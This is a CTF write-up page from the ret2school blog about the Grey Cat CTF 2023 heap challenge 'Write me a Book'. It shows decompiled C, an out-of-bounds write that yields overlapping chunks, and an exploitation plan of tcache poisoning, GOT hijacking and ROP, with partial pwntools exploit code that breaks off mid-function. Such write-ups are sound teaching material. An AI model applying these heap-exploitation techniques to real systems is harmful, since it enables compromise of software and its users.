@@ -1,0 +1,753 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[Grey Cat CTF Quals 2023 - pwn] Write me a Book // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8K5XT0SJN8"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8K5XT0SJN8', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[Grey Cat CTF Quals 2023 - pwn] Write me a Book"/>
+<meta name="twitter:description" content="Write me a book  Write me a Book 349
+Give back to the library! Share your thoughts and experiences!
+The flag can be found in /flag
+Elma
+nc 34.124.157.94 12346
+ Write me a book is a heap challenge I did during the Grey Cat The Flag 2023 Qualifiers. You can find the tasks and the exploit here.
+TL;DR To manage to read the flag we have to:
+ create overlapping chunks due to an oob write vulnerability in rewrite_books tcache poisoning thanks to the overlapping chunks Overwrite the first entry of @books to then be able to rewrite 4 entries of @books by setting a large size."/>
+
+    <meta property="og:title" content="[Grey Cat CTF Quals 2023 - pwn] Write me a Book" />
+<meta property="og:description" content="Write me a book  Write me a Book 349
+Give back to the library! Share your thoughts and experiences!
+The flag can be found in /flag
+Elma
+nc 34.124.157.94 12346
+ Write me a book is a heap challenge I did during the Grey Cat The Flag 2023 Qualifiers. You can find the tasks and the exploit here.
+TL;DR To manage to read the flag we have to:
+ create overlapping chunks due to an oob write vulnerability in rewrite_books tcache poisoning thanks to the overlapping chunks Overwrite the first entry of @books to then be able to rewrite 4 entries of @books by setting a large size." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/writemeabook/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2023-05-21T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-05-21T00:00:00+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/ret2school_fr" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[Grey Cat CTF Quals 2023 - pwn] Write me a Book</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          May 21, 2023
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          13 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/nasm/">nasm</a>
+              <a class="tag" href="https://ret2school.github.io/tags/pwn/">pwn</a>
+              <a class="tag" href="https://ret2school.github.io/tags/heap/">heap</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="write-me-a-book">Write me a book</h1>
+<blockquote>
+<p>Write me a Book
+349</p>
+<p>Give back to the library! Share your thoughts and experiences!</p>
+<p>The flag can be found in /flag</p>
+<p>Elma</p>
+<p>nc 34.124.157.94 12346</p>
+</blockquote>
+<p>Write me a book is a heap challenge I did during the <a href="https://nusgreyhats.org/">Grey Cat The Flag 2023 Qualifiers</a>. You can find the tasks and the exploit <a href="https://github.com/ret2school/ctf/tree/master/2023/greyctf/pwn/writemeabook">here</a>.</p>
+<h2 id="tldr">TL;DR</h2>
+<p>To manage to read the flag we have to:</p>
+<ul>
+<li>create overlapping chunks due to an oob write vulnerability in <code>rewrite_books</code></li>
+<li>tcache poisoning thanks to the overlapping chunks</li>
+<li>Overwrite the first entry of <code>@books</code> to then be able to rewrite 4 entries of <code>@books</code> by setting a large size.</li>
+<li>With the read / write primitives of <code>@books</code> we leak <code>&amp;stdout@glibc</code> and <code>environ</code>, this way getting a libc and stack leak.</li>
+<li>This way we can simply ROP over a given stackframe.</li>
+</ul>
+<h2 id="general-overview">General overview</h2>
+<p>Let&rsquo;s take a look at the protections and the version of the libc:</p>
+<pre tabindex="0"><code>$ ./libc.so.6 
+GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
+Copyright (C) 2022 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 11.2.0.
+libc ABIs: UNIQUE IFUNC ABSOLUTE
+For bug reporting instructions, please see:
+&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
+$ checksec --file ./libc.so.6 
+[*] '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/greyctf/pwn/writemeabook/dist/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre><p>So a very recent one with standards protections. Then let&rsquo;s take a look at the binary:</p>
+<pre tabindex="0"><code>$ checksec --file chall
+[*] '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/greyctf/pwn/writemeabook/dist/chall'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x3fd000)
+    RUNPATH:  b'/home/nasm/Documents/pwn/greycat/writemeabook/dist'
+$ seccomp-tools dump ./chall
+Welcome to the library of hopes and dreams!
+
+We heard about your journey...
+and we want you to share about your experiences!
+
+What would you like your author signature to be?
+&gt; aa
+
+Great! We would like you to write no more than 10 books :)
+Please feel at home.
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
+ 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
+ 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
+ 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
+ 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
+ 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
+ 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0011: 0x06 0x00 0x00 0x00000000  return KILL
+</code></pre><p>The binary isn&rsquo;t PIE based and does have a seccomp that allows only <code>read</code>, <code>write</code>, <code>open</code> and <code>exit</code>. Which will make the exploitation harder (but not that much).</p>
+<h2 id="code-review">Code review</h2>
+<p>The <code>main</code> looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__cdecl</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>argv, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>envp)
+{
+  setup(argc, argv, envp);
+  puts(<span style="color:#f1fa8c">&#34;Welcome to the library of hopes and dreams!&#34;</span>);
+  puts(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">We heard about your journey...&#34;</span>);
+  puts(<span style="color:#f1fa8c">&#34;and we want you to share about your experiences!&#34;</span>);
+  puts(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">What would you like your author signature to be?&#34;</span>);
+  printf(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>);
+  LODWORD(author_signature) <span style="color:#ff79c6">=</span> &#39; yb&#39;;
+  __isoc99_scanf(<span style="color:#f1fa8c">&#34;%12s&#34;</span>, (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>author_signature <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">3</span>);
+  puts(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">Great! We would like you to write no more than 10 books :)&#34;</span>);
+  puts(<span style="color:#f1fa8c">&#34;Please feel at home.&#34;</span>);
+  secure_library();
+  write_books();
+  <span style="color:#ff79c6">return</span> puts(<span style="color:#f1fa8c">&#34;Goodbye!&#34;</span>);
+}
+</code></pre></div><p>We have to give a signature (12 bytes max) sorted in <code>author_signatures</code>, then the program is allocating a lot of chunks in <code>secure_library</code>. Finally it calls <code>write_books</code> which contains the main logic:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">write_books</span>()
+{
+  <span style="color:#8be9fd">int</span> choice; <span style="color:#6272a4">// [rsp+0h] [rbp-10h] BYREF
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> fav_num; <span style="color:#6272a4">// [rsp+4h] [rbp-Ch] BYREF
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v3; <span style="color:#6272a4">// [rsp+8h] [rbp-8h]
+</span><span style="color:#6272a4"></span>
+  v3 <span style="color:#ff79c6">=</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
+  <span style="color:#ff79c6">while</span> ( <span style="color:#bd93f9">1</span> )
+  {
+    <span style="color:#ff79c6">while</span> ( <span style="color:#bd93f9">1</span> )
+    {
+      print_menu();
+      __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>choice);
+      getchar();
+      <span style="color:#ff79c6">if</span> ( choice <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">1337</span> )
+        <span style="color:#ff79c6">break</span>;
+      <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>secret_msg )
+      {
+        printf(<span style="color:#f1fa8c">&#34;What is your favourite number? &#34;</span>);
+        __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>fav_num);
+        <span style="color:#ff79c6">if</span> ( fav_num <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> fav_num <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">10</span> <span style="color:#ff79c6">&amp;&amp;</span> slot[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> fav_num <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">2</span>] )
+          printf(<span style="color:#f1fa8c">&#34;You found a secret message: %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, slot[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> fav_num <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">2</span>]);
+        secret_msg <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
+      }
+<span style="color:#8be9fd;font-style:italic">LABEL_19</span>:
+      puts(<span style="color:#f1fa8c">&#34;Invalid choice.&#34;</span>);
+    }
+    <span style="color:#ff79c6">if</span> ( choice <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">1337</span> )
+      <span style="color:#ff79c6">goto</span> LABEL_19;
+    <span style="color:#ff79c6">if</span> ( choice <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">4</span> )
+      <span style="color:#ff79c6">return</span> v3 <span style="color:#ff79c6">-</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
+    <span style="color:#ff79c6">if</span> ( choice <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">4</span> )
+      <span style="color:#ff79c6">goto</span> LABEL_19;
+    <span style="color:#ff79c6">switch</span> ( choice )
+    {
+      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">3</span><span style="color:#ff79c6">:</span>
+        throw_book();
+        <span style="color:#ff79c6">break</span>;
+      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span>
+        write_book();
+        <span style="color:#ff79c6">break</span>;
+      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">2</span><span style="color:#ff79c6">:</span>
+        rewrite_book();
+        <span style="color:#ff79c6">break</span>;
+      <span style="color:#ff79c6">default</span><span style="color:#ff79c6">:</span>
+        <span style="color:#ff79c6">goto</span> LABEL_19;
+    }
+  }
+}
+</code></pre></div><p>There are basically three handlers:</p>
+<ul>
+<li><code>1337</code>, we can leak only one time the address of a given allocated chunk.</li>
+<li><code>4</code> returns.</li>
+<li><code>3</code> free a chunk.</li>
+<li><code>1</code> add a book.</li>
+<li><code>2</code> edit a book.</li>
+</ul>
+<p>Let&rsquo;s take a quick look at each handler, first the free handler:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">throw_book</span>()
+{
+  <span style="color:#8be9fd">int</span> v1; <span style="color:#6272a4">// [rsp+4h] [rbp-Ch] BYREF
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v2; <span style="color:#6272a4">// [rsp+8h] [rbp-8h]
+</span><span style="color:#6272a4"></span>
+  v2 <span style="color:#ff79c6">=</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
+  puts(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">At which index of the shelf would you like to throw your book?&#34;</span>);
+  printf(<span style="color:#f1fa8c">&#34;Index: &#34;</span>);
+  __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>v1);
+  getchar();
+  <span style="color:#ff79c6">if</span> ( v1 <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> v1 <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">10</span> <span style="color:#ff79c6">&amp;&amp;</span> slot[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> v1 <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">2</span>] )
+  {
+    free(slot[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">--</span>v1]);
+    slot[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> v1] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
+    puts(<span style="color:#f1fa8c">&#34;Your book has been thrown!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+  }
+  <span style="color:#ff79c6">else</span>
+  {
+    puts(<span style="color:#f1fa8c">&#34;Invaid slot!&#34;</span>);
+  }
+  <span style="color:#ff79c6">return</span> v2 <span style="color:#ff79c6">-</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
+}
+</code></pre></div><p>It only checks is the entry exists and if the index is in the right range. if it does it frees the entry and zeroes it.</p>
+<p>Then, the add handler:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">write_book</span>()
+{
+  <span style="color:#8be9fd">int</span> idx2; <span style="color:#6272a4">// ebx
+</span><span style="color:#6272a4"></span>  _QWORD <span style="color:#ff79c6">*</span>v1; <span style="color:#6272a4">// rcx
+</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v2; <span style="color:#6272a4">// rdx
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> idx; <span style="color:#6272a4">// [rsp+4h] [rbp-4Ch] BYREF
+</span><span style="color:#6272a4"></span>  size_t size; <span style="color:#6272a4">// [rsp+8h] [rbp-48h]
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">32</span>]; <span style="color:#6272a4">// [rsp+10h] [rbp-40h] BYREF
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v7; <span style="color:#6272a4">// [rsp+30h] [rbp-20h]
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+38h] [rbp-18h]
+</span><span style="color:#6272a4"></span>
+  v8 <span style="color:#ff79c6">=</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
+  puts(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">At which index of the shelf would you like to insert your book?&#34;</span>);
+  printf(<span style="color:#f1fa8c">&#34;Index: &#34;</span>);
+  __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>idx);
+  getchar();
+  <span style="color:#ff79c6">if</span> ( idx <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">||</span> idx <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">10</span> <span style="color:#ff79c6">||</span> slot[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">2</span>] )
+  {
+    puts(<span style="color:#f1fa8c">&#34;Invaid slot!&#34;</span>);
+  }
+  <span style="color:#ff79c6">else</span>
+  {
+    <span style="color:#ff79c6">--</span>idx;
+    memset(buf, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(buf));
+    v7 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+    puts(<span style="color:#f1fa8c">&#34;Write me a book no more than 32 characters long!&#34;</span>);
+    size <span style="color:#ff79c6">=</span> read(<span style="color:#bd93f9">0</span>, buf, <span style="color:#bd93f9">0x20uLL</span>) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x10</span>;
+    idx2 <span style="color:#ff79c6">=</span> idx;
+    slot[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx2] <span style="color:#ff79c6">=</span> malloc(size);
+    memcpy(slot[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx], buf, size <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span>);
+    v1 <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)slot[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx] <span style="color:#ff79c6">+</span> size <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span>;
+    v2 <span style="color:#ff79c6">=</span> qword_4040D8;
+    <span style="color:#ff79c6">*</span>v1 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)author_signature;
+    v1[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> v2;
+    books[idx].size <span style="color:#ff79c6">=</span> size;
+    puts(<span style="color:#f1fa8c">&#34;Your book has been published!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+  }
+  <span style="color:#ff79c6">return</span> v8 <span style="color:#ff79c6">-</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
+}
+</code></pre></div><p>We can allocate a chunk between <code>0x10</code> and <code>0x20 + 0x10</code> bytes and after we wrote in it the signature initially choose at the begin of the execution is put right after the end of the input.</p>
+<p>Finally comes the handler where lies the vuln, the edit handler:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">rewrite_book</span>()
+{
+  _QWORD <span style="color:#ff79c6">*</span>v0; <span style="color:#6272a4">// rcx
+</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v1; <span style="color:#6272a4">// rdx
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> idx; <span style="color:#6272a4">// [rsp+Ch] [rbp-14h] BYREF
+</span><span style="color:#6272a4"></span>  ssize_t v4; <span style="color:#6272a4">// [rsp+10h] [rbp-10h]
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v5; <span style="color:#6272a4">// [rsp+18h] [rbp-8h]
+</span><span style="color:#6272a4"></span>
+  v5 <span style="color:#ff79c6">=</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
+  puts(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">At which index of the shelf would you like to rewrite your book?&#34;</span>);
+  printf(<span style="color:#f1fa8c">&#34;Index: &#34;</span>);
+  __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>idx);
+  getchar();
+  <span style="color:#ff79c6">if</span> ( idx <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> idx <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">10</span> <span style="color:#ff79c6">&amp;&amp;</span> slot[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">2</span>] )
+  {
+    <span style="color:#ff79c6">--</span>idx;
+    puts(<span style="color:#f1fa8c">&#34;Write me the new contents of your book that is no longer than what it was before.&#34;</span>);
+    v4 <span style="color:#ff79c6">=</span> read(<span style="color:#bd93f9">0</span>, slot[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx], books[idx].size);
+    v0 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">*</span>)((<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)slot[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx]<span style="color:#ff79c6">-&gt;</span>buf <span style="color:#ff79c6">+</span> v4);
+    v1 <span style="color:#ff79c6">=</span> qword_4040D8;
+    <span style="color:#ff79c6">*</span>v0 <span style="color:#ff79c6">=</span> author_signature;
+    v0[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> v1;
+    puts(<span style="color:#f1fa8c">&#34;Your book has been rewritten!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+  }
+  <span style="color:#ff79c6">else</span>
+  {
+    puts(<span style="color:#f1fa8c">&#34;Invaid slot!&#34;</span>);
+  }
+  <span style="color:#ff79c6">return</span> v5 <span style="color:#ff79c6">-</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
+}
+</code></pre></div><p>As you can read there is an out of bound write if we input <code>books[idx].size</code> bytes, indeed given the chunk stores only <code>books[idx].size</code> bytes the signature writes over the current chunk. And most of the time on the header (and especially the size) of the next chunk allocated in memory resulting an overlapping chunk.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Given we can get overlapping chunks we&rsquo;re able to do tcache poisoning on the <code>0x40</code> tcachebin (to deeply understand why I advice you to read the exploit and to run it into gdb). At this point we can simply write the first entry of <code>@books</code> that is stored at a fixed memory area within the binary (no PIE). In this new entry we could write a pointer to itself but with a large size in order to be able to write several entries of <code>@books</code>. When it is done we could write these entries:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">    edit(<span style="color:#bd93f9">1</span>, pwn<span style="color:#ff79c6">.</span>flat([
+            <span style="color:#6272a4"># 1==</span>
+            <span style="color:#bd93f9">0xff</span>, <span style="color:#6272a4"># sz</span>
+            exe<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>stdout, <span style="color:#6272a4"># to leak libc</span>
+            <span style="color:#6272a4"># 2==</span>
+            <span style="color:#bd93f9">0x8</span>, <span style="color:#6272a4"># sz</span>
+            exe<span style="color:#ff79c6">.</span>got<span style="color:#ff79c6">.</span>free, <span style="color:#6272a4"># to do GOT hiijacking</span>
+            <span style="color:#6272a4"># 3==</span>
+            <span style="color:#bd93f9">0x8</span>, <span style="color:#6272a4"># sz</span>
+            exe<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>secret_msg, <span style="color:#6272a4"># to be able to print an entry of @books</span>
+            <span style="color:#6272a4"># 4==</span>
+            <span style="color:#bd93f9">0xff</span>, <span style="color:#6272a4"># sz</span>
+            exe<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>books <span style="color:#6272a4"># ptr to itself to be able to rewrite the entries when we need to do so</span>
+        ] <span style="color:#ff79c6">+</span> [<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x60</span>, filler <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
+</code></pre></div><p>This way we can easily leak libc.</p>
+<h2 id="leaking-libc">Leaking libc</h2>
+<p>Leaking libc is very easy given we already setup the entries of <code>@books</code>. We can replace <code>free@GOT</code> by <code>puts@plt</code>. This way the next time free will be called on an entry, it will leak the datas towards which the entry points. Which means <code>free(book[1])</code> leaks the address of stdout within the libc.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">STDOUT <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x21a780</span>
+
+<span style="color:#6272a4"># [...]</span>
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">libc_leak_free</span>(idx):
